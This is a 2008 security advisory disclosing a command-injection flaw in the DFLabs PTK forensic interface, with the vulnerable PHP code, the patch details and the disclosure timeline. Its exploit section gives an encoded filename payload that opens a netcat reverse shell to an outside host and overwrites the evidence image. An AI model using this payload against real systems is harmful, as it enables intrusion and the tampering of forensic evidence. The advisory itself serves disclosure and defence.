@@ -1,0 +1,240 @@
+==================================================== 
+Security Research Advisory
+
+Vulnerability name: DFLabs PTK Local Command Execution Vulnerability
+Advisory number: LC-2008-07
+Advisory URL: http://www.ikkisoft.com
+
+==================================================== 
+1) Affected Software 
+
+* DFLabs PTK 1.0 (final release)
+
+Previous versions are affected as well:
+
+* DFLabs PTK 0.2
+* DFLabs PTK 0.1
+
+====================================================
+2) Severity 
+
+Severity: High
+Local/Remote: Local
+
+Note: remote command execution is possible and moreover 
+easy to trigger; however, due to the nature of the tool, only 
+the local command execution poses a serious real world threat
+
+==================================================== 
+3) Summary
+
+As reported in the project website, "PTK is an alternative advanced interface 
+for the suite TSK (The Sleuth Kit). [...] PTK is not just a new graphic and 
+highly professional interface based on Ajax technology but offers a great deal 
+of features like analysis, search and management of complex cases of digital 
+investigation". PTK is included within the SANS Investigative Forensic Toolkit 
+(SIFT) Workstation.
+
+This application is vulnerable to multiple input validation attacks. The 
+possibility to exploit these findings introduces several malicious scenarios. 
+For instance, a criminal may abuse this specific vulnerability to modify 
+the evidence of the crime, compromising the digital investigation workstation. 
+Even if the original evidence should be accessed only in read-only mode, 
+using also hardware write blockers according to forensic best practices, 
+several malicious scenarios are possible with just the alteration of the 
+working copy image. Additionally, a payload could be crafted to hide, 
+or alter, just the information presented to the analyst, something which 
+would not be evident unless the same image is analyzed with a tool not 
+vulnerable to the attack.
+
+In our research, we have developed a reliable Proof-of-Concept in order 
+to exploit an arbitrary local command execution vulnerability showing possible 
+anti forensic attacks. As defined by Rogers D. M. (2005), anti forensics 
+attempts to "negatively affect the existence, amount and/or quality of 
+evidence from a crime scene, or make the analysis and examination of evidence 
+difficult or impossible to conduct".
+
+References:
+http://ptk.dflabs.com/
+http://en.wikipedia.org/wiki/Counter_forensics
+
+====================================================
+4) Vulnerability Details
+
+The PTK interface is prone to multiple input validation vulnerabilities that may 
+result in a silent local command execution.
+
+Since the application fails to validate most of the input vectors, Cross Site 
+Scripting, CSRF and other flaws are possible. However, due to the nature of the 
+tool, our research aimed to point out the possible risks and attack techniques 
+which could be used in order to silently compromise the investigation platform 
+and corrupt evidence without user interaction.
+Even if the application is vulnerable to remote command execution, as a real life 
+threat it is pretty unrealistic. PTK, as well as Autopsy, are usually used in the 
+"localhost" context where a single user (the investigator) analyzes the crime image.
+
+However, in our humble opinion, a local command execution vulnerability triggered 
+by the simple inclusion of the acquired crime scene image should be considered 
+as an HIGH impact flaw with an HIGH exploitability rate.
+
+Once the investigator has loaded the binary image (e.g. a "dd" file), he can 
+browse the filesystem tree and look for a specific file. During the browsing, 
+the Ajax-based application uses binaries of the Sleuth Kit in order to access 
+the acquired image content. In the browsing, the "fls" application is involved. 
+As illustrated in the man, it lists the files and directory names in the image 
+and can display file names of recently deleted files for the directory using the 
+given inode.
+
+Once the investigator selects a specific file from the image filesystem, PTK 
+invokes the following script:
+
+/ptk/lib/file_content.php?arg1=null&arg2=107533&arg3=<FILENAME>&arg4=1  
+
+where <FILENAME> is the filename without any kind of input validation retrieved 
+from the image via fls. 
+A malicious user (e.g. a person under investigation) may abuse this attack input
+simply creating a crafted file in his/her filesystem, as demonstrated below.
+
+Due to the possibility to pollute the "arg3" variable, we can also override the 
+"arg1" HTTP parameter with the following content:
+
+arg3 --> Confidential.doc&arg1=[new arg1 variable value]
+
+This request is managed by PTK using the following code:
+
+[..]
+$offset = $_GET['arg1'];
+$inode = $_GET['arg2'];
+$name = $_GET['arg3'];
+$partition_id = $_GET['arg4'];
+$page_offset = 100;
+[..]
+$type = get_file_type($_SESSION['image_path'], $offset, $inode);
+[..]
+
+where the function "get_file_type" is:
+
+function get_file_type($path, $offset, $inode){
+	include("../config/conf.php");
+	if($offset == 'null'){
+		$offset = '';
+	}else{
+		$offset = "-o $offset";
+	}
+	if($inode == 'null') $inode = '';
+	$result = shell_exec("$icat_bin -r $offset $path $inode | $file_bin -zb -");
+	if(preg_match("/(image data)|(PC bitmap data)/", $result)){
+		$_SESSION['is_graphic'] = 1;
+	}
+	return $result;
+}
+
+As you can see, the $offset variable used within the unfiltered shell_exec 
+function could be used in order to execute arbitrary system commands 
+with the privileges of the web server. 
+
+Since the malicious payload should be included in the filename, some obfuscation 
+techniques are pretty interesting in order to force PTK to not reveal the real filename.
+Several possibilities were tested, including the usage of UTF-7 encoding since PTK 
+does not force a specific page charset. However the most reliable and easy to use 
+technique is the inclusion of fake HTML tags:
+
+Confidential.doc<aa&arg1=[ENCODED PAYLOAD]>
+
+It should be noted that the simple injection of HTML tag chars ("<", "&", ">", ..) 
+is not possible due to HTML filtering which results in the corresponding HTML entities.
+
+Lastly, we want to inform the PTK team that other functions are probably vulnerable 
+to similar attacks.  Several instances of the "shell_exec" PHP function are present 
+in the "/lib" files and they are used with unfiltered parameters:
+
+/lib/check_image_integrity.php 
+/lib/folder_browsing.php
+/lib/lib_command.php
+/lib/new_image.php
+
+$ grep -R "shell_exec(" ./lib/ | wc -l
+73
+
+Since PTK needs to execute system commands in order to invoke the Sleuth Kit 
+binaries, no standard mitigations are applicable (e.g. disable_functions, 
+safe_mode and others). 
+
+==================================================== 
+5) Exploit 
+
+The attacker can use this crafted filename in order to silently trigger the 
+arbitrary command execution and open a remote shell: 
+
+Confidential.doc<aa&arg1=%61%3b%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20
+%31%39%32%2e%31%36%38%2e%31%2e%33%20%31%32%33%34%35%3b>
+
+From the application point of view, it results in the following commands:
+
+"/usr/local/bin/icat -r -o a;nc -e /bin/bash 192.168.1.3 12345;> /var/www/ptk/
+images/myCase_myCrime.001 1936 | /usr/bin/file -zb -"
+
+In addition to the remote shell, this payload compromises the crime evidence
+because the char ">" acts as an output redirection in the shell, resulting in 
+the acquired image overriding. If the image was added using the option "symlink", 
+the working-copy crime image is fatally compromised. Obviously, according to the 
+forensic best practices, the original image should be accessed in read-only mode 
+and carefully stored.
+
+A demonstration video of the attack is provided as well. 
+- http://www.vimeo.com/2161045 (High quality streaming)
+- http://uk.youtube.com/watch?v=KXXALJUrdYM&fmt=18 (Low quality streaming)
+- http://www.ikkisoft.com/stuff/ptk_exploit_poc.avi
+
+
+According to the PTK Practice Cases (http://ptk.dflabs.com/tutorial.html), 
+a standard Linux Ubuntu with Apache, MySQL and PHP5 was used during our test.
+
+==================================================== 
+6) Fix Information 
+
+A software update is required in order to resolve this issue. 
+The PTK team has released a new version (ptk-1.0.1.tar.gz, 04/11/2008), 
+available on the project website.
+
+Upgrade your PTK as soon as possible!
+
+The new version deploys OWASP PHP filters to avoid unexpected input used 
+within Sleuth Kit binaries.
+
+In order to clarify their position about security bug reports, the team has 
+published the following comment: http://ptk.dflabs.com/faq.html 
+
+==================================================== 
+7) Time Table 
+
+30/10/2008 - Vendor notified.
+30/10/2008 - Vendor response.
+04/11/2008 - Vendor patch release.
+05/11/2008 - Public disclosure.
+
+==================================================== 
+8) Credits 
+
+Discovered by Luca "ikki" Carettoni - luca.carettoni[at]ikkisoft[dot]com
+
+==================================================== 
+9) Legal Notices
+
+The information in the advisory is believed to be accurate at the time of
+publishing based on currently available information. 
+This information is provided as-is, as a free service to the community. 
+There are no warranties with regard to this information.
+The author does not accept any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on, this information.
+Permission is hereby granted for the redistribution of this alert, provided 
+that the content is not altered in any way, except reformatting, and that due 
+credit is given.
+
+This vulnerability has been disclosed in accordance with 
+the RFP Full-Disclosure Policy v2.0, available at:
+http://www.wiretrip.net/rfp/policy.html
+
+====================================================
+
+# milw0rm.com [2008-11-05]
